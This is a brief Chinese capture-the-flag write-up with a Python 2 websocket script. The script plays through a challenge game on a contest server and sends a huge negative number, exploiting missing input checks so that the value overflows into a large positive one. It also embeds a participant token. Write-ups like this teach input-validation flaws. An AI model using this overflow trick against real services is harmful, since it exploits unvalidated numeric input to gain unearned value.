这道题用websocket写主要是为了试手,为之后的powershell迷宫做了铺垫,这道题的关键点在于变量取值的一个小漏洞,取负值没有限制,于是填上非常小的负数,
然后空间溢出,变成正值.

```
#!/usr/bin/python2
#coding:utf-8

from websocket import create_connection
import time

token="416:MEUCIQD4wz3qknMtWb9J2w5b5aPkFXjxeobWbsgdw+kCafOixAIgaLQp/xq0HAoxOX6/ylW3fZ0OSKmU8nFeycjVUqwtrfs="
cookies={'token':'416:MEUCIQD4wz3qknMtWb9J2w5b5aPkFXjxeobWbsgdw+kCafOixAIgaLQp/xq0HAoxOX6/ylW3fZ0OSKmU8nFeycjVUqwtrfs='}

ws = create_connection("ws://202.38.93.241:10021/ws")

a =  ws.recv()
print(a)

ws.send('0')
print(ws.recv())
print(ws.recv())

ws.send('0')
print(ws.recv())
print(ws.recv())


ws.send('0')
print(ws.recv())

ws.send('25')
print(ws.recv())
print(ws.recv())

ws.send('0')
print(ws.recv())
ws.send('-2500000000000000000')
print(ws.recv())
print(ws.recv())

ws.send('2')
print(ws.recv())
ws.send('0')
print(ws.recv())
print(ws.recv())
ws.send('2')
print(ws.recv())

print(ws.recv())


ws.send('2')
print(ws.recv())

ws.close()
```
